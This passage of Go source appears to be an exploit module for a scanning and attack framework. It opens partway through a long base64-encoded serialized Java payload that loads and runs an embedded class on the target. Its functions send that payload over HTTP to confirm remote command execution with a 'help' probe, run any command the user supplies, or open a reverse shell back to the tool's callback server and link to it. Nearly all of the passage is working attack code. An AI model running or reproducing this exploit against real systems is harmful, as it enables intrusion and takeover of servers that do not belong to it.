FBQXRFcXR3QUd1QUFIdGdBSVRDdTJBQWtTQ3JZQUMwMHNCTFlBREN3cnRnQU53QUFPd0FBT1RnTTJCQlVFTGI2aUFxTXRGUVF5T2dVWkJjY0FCcWNDanhrRnRnQVBPZ1laQmhJUXRnQVJtZ0FOR1FZU0VyWUFFWm9BQnFjQ2NSa0Z0Z0FKRWhPMkFBdE5MQVMyQUF3c0dRVzJBQTA2QnhrSHdRQVVtZ0FHcHdKT0dRZTJBQWtTRmJZQUMwMHNCTFlBREN3WkI3WUFEVG9IR1FlMkFBa1NGcllBQzAybkFCWTZDQmtIdGdBSnRnQVl0Z0FZRWhhMkFBdE5MQVMyQUF3c0dRZTJBQTA2QnhrSHRnQUp0Z0FZRWhtMkFBdE5wd0FRT2dnWkI3WUFDUkladGdBTFRTd0V0Z0FNTEJrSHRnQU5PZ2NaQjdZQUNSSWF0Z0FMVFN3RXRnQU1MQmtIdGdBTndBQWJ3QUFiT2dnRE5na1ZDUmtJdVFBY0FRQ2lBYWdaQ0JVSnVRQWRBZ0E2Q2hrS3RnQUpFaDYyQUF0TkxBUzJBQXdzR1FxMkFBMDZDeGtMdGdBSkVoOER2UUFndGdBaEdRc0R2UUFpdGdBak9nd1pDN1lBQ1JJa0JMMEFJRmtEc2dBbHh3QVBFaWE0QUNkWnN3QWxwd0FHc2dBbFU3WUFJUmtMQkwwQUlsa0RFaWhUdGdBandBQXBPZzBaRGNjQUJxY0JKU29aRGJZQUtyWUFLem9PR1F5MkFBa1NMQVM5QUNCWkE3SUFMVk8yQUNFWkRBUzlBQ0paQTdzQUxsa1JBTWkzQUM5VHRnQWpWeW9TTUxZQU1Ub1BHUSsyQURJNkJ4a1BFak1HdlFBZ1dRT3lBRFRIQUE4U05iZ0FKMW16QURTbkFBYXlBRFJUV1FTeUFDMVRXUVd5QUMxVHRnQTJHUWNHdlFBaVdRTVpEbE5aQkxzQUxsa0R0d0F2VTFrRnV3QXVXUmtPdnJjQUwxTzJBQ05YR1F5MkFBa1NOd1M5QUNCWkF4a1BVN1lBSVJrTUJMMEFJbGtER1FkVHRnQWpWNmNBWWpvUEtoSTV0Z0F4T2hBWkVCSTZCTDBBSUZrRHNnQTB4d0FQRWpXNEFDZFpzd0EwcHdBR3NnQTBVN1lBTmhrUUJMMEFJbGtER1E1VHRnQWpPZ2NaRExZQUNSSTNCTDBBSUZrREdSQlR0Z0FoR1F3RXZRQWlXUU1aQjFPMkFDTlhwd0FYaEFrQnAvNVNwd0FJT2dhbkFBT0VCQUduL1Z5eEFBZ0Fsd0NpQUtVQUZ3REZBTk1BMWdBWEFkQUNWd0phQURnQU5nQTdBc1VBT0FBK0FGa0N4UUE0QUZ3QWZBTEZBRGdBZndLNUFzVUFPQUs4QXNJQ3hRQTRBQUVBaGdBQUFPNEFPd0FBQUEwQUJBQU9BQXNBRHdBVkFCQUFHZ0FSQUNZQUV3QXdBQlFBTmdBV0FENEFGd0JGQUJnQVhBQVpBR2NBR2dCc0FCc0FkQUFjQUg4QUhRQ0tBQjRBandBZkFKY0FJUUNpQUNRQXBRQWlBS2NBSXdDNEFDVUF2UUFtQU1VQUtBRFRBQ3NBMWdBcEFOZ0FLZ0RqQUN3QTZBQXRBUEFBTGdEN0FDOEJBQUF3QVE0QU1RRWRBRElCS0FBekFUTUFOQUU0QURVQlFBQTJBVmtBTndHU0FEZ0Jsd0E1QVpvQU93R2xBRHdCMEFBK0FkZ0FQd0hmQUVBQ05RQkJBbGNBUmdKYUFFSUNYQUJEQW1RQVJBS1hBRVVDdVFCSEFyd0FNUUxDQUVzQ3hRQkpBc2NBU2dMS0FCTUMwQUJOQUljQUFBQUVBQUVBT0FBQkFJZ0FpUUFDQUlVQUFBQTVBQUlBQXdBQUFCRXJ1QUFCc0UyNEFBZTJBRHNydGdBOHNBQUJBQUFBQkFBRkFBSUFBUUNHQUFBQURnQURBQUFBVndBRkFGZ0FCZ0JaQUljQUFBQUVBQUVBQWdBQkFJb0Fpd0FCQUlVQUFBQ1BBQVFBQXdBQUFGY3J4Z0FNRWowcnRnQSttUUFHRWord0s3WUFRRXdyRWtHMkFFS1pBQ2dyRWtFU1BiWUFReEpFdGdCRlRTeStCWjhBQmhKR3NDb3NBeklzQkRLNEFFZTJBRWl3S2lzU1FSSTl0Z0JERWtrU1BiWUFRN1lBU3JBQUFBQUJBSVlBQUFBbUFBa0FBQUJqQUEwQVpBQVFBR1lBRlFCbkFCNEFhUUFzQUdvQU1nQnJBRFVBYlFCREFHOEFBUUNNQUlzQUFRQ0ZBQUFCeWdBRUFBa0FBQUVxRWt1NEFFeTJBRTFOSzdZQVFFd0JUZ0U2QkN3U1RyWUFFWmtBUUNzU1Q3WUFFWmtBSUNzU1VMWUFFWm9BRjdzQVVWbTNBRklydGdCVEVsUzJBRk8yQUZWTUJyMEFLVmtERWloVFdRUVNWbE5aQlN0VE9nU25BRDByRWsrMkFCR1pBQ0FyRWxDMkFCR2FBQmU3QUZGWnR3QlNLN1lBVXhKWHRnQlR0Z0JWVEFhOUFDbFpBeEpZVTFrRUVsbFRXUVVyVXpvRXVBQmFHUVMyQUZ0T3V3QmNXUzIyQUYyM0FGNFNYN1lBWURvRkdRVzJBR0daQUFzWkJiWUFZcWNBQlJJOU9nYTdBRnhaTGJZQVk3Y0FYaEpmdGdCZ09nVzdBRkZadHdCU0dRYTJBRk1aQmJZQVlaa0FDeGtGdGdCaXB3QUZFajIyQUZPMkFGVTZCaGtHT2djdHhnQUhMYllBWkJrSHNEb0ZHUVcyQUdVNkJpM0dBQWN0dGdCa0dRYXdPZ2d0eGdBSExiWUFaQmtJdndBRUFKTUEvZ0VKQURnQWt3RCtBUjBBQUFFSkFSSUJIUUFBQVIwQkh3RWRBQUFBQVFDR0FBQUFiZ0FiQUFBQWN3QUpBSFFBRGdCMUFCQUFkZ0FUQUhjQUhBQjRBQzRBZVFCQ0FIc0FXUUI5QUdzQWZnQi9BSUFBa3dDREFKd0FoQUN1QUlVQXdnQ0dBTlFBaHdENkFJZ0EvZ0NNQVFJQWpRRUdBSWdCQ1FDSkFRc0FpZ0VTQUl3QkZnQ05BUm9BaWdFZEFJd0JJd0NOQUFFQWpRQ09BQUVBaFFBQUFZTUFCQUFNQUFBQTh4Skx1QUJNdGdCTkVrNjJBQkdhQUJDN0FDbFpFbWEzQUdkT3B3QU51d0FwV1JKb3R3Qm5UcmdBV2kyMkFHazZCTHNBYWxrckxMWUFhN2NBYkRvRkdRUzJBRjA2QmhrRXRnQmpPZ2NaQmJZQWJUb0lHUVMyQUc0NkNSa0Z0Z0J2T2dvWkJiWUFjSm9BWUJrR3RnQnhuZ0FRR1FvWkJyWUFjcllBYzZmLzdoa0h0Z0J4bmdBUUdRb1pCN1lBY3JZQWM2Zi83aGtJdGdCeG5nQVFHUWtaQ0xZQWNyWUFjNmYvN2hrS3RnQjBHUW0yQUhRVUFIVzRBSGNaQkxZQWVGZW5BQWc2QzZmL25oa0V0Z0JrR1FXMkFIbW5BQ0JPdXdCUldiY0FVaEo2dGdCVExiWUFlN1lBVXhKOHRnQlR0Z0JWc0JKOXNBQUNBTGdBdmdEQkFEZ0FBQURRQU5NQU9BQUJBSVlBQUFCdUFCc0FBQUNiQUJBQW5BQWRBSjRBSndDZ0FEQUFvUUErQUtJQVV3Q2pBR0VBcEFCcEFLVUFjUUNtQUg0QXFBQ0dBS2tBa3dDckFKc0FyQUNvQUs0QXJRQ3ZBTElBc0FDNEFMSUF2Z0N6QU1FQXRBRERBTFVBeGdDM0FNc0F1QURRQUxzQTB3QzVBTlFBdWdEd0FMd0FDQUNQQUlrQUFnQ0ZBQUFBTWdBREFBSUFBQUFTS3JnQUFiQk11d0FEV1N1MkFBUzNBQVcvQUFFQUFBQUVBQVVBQWdBQkFJWUFBQUFHQUFFQUFBQTNBSUVBQUFBQUFBRUFrQUFBQUFJQWtRPT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=")
		cfg.Data = string(data)
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			respBody := sendPayload15645265(hostInfo, "@@@@@help")
			return (strings.Contains(respBody, "ASSOC     ") && strings.Contains(respBody, "ATTRIB  ")) || strings.Contains(respBody, "history [-c] [-d offset] [n] or history -anrw [filename] or ")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"].(string) == "cmd" {
				cmd := "@@@@@" + ss.Params["cmd"].(string)
				respBody := sendPayload15645265(expResult.HostInfo, cmd)
				if len(respBody) > 0 {
					expResult.Success = true
					expResult.Output = respBody
				}
			} else if ss.Params["attackType"].(string) == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				sendPayload15645265(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				return expResult
			}

			return expResult
		},
	))
}
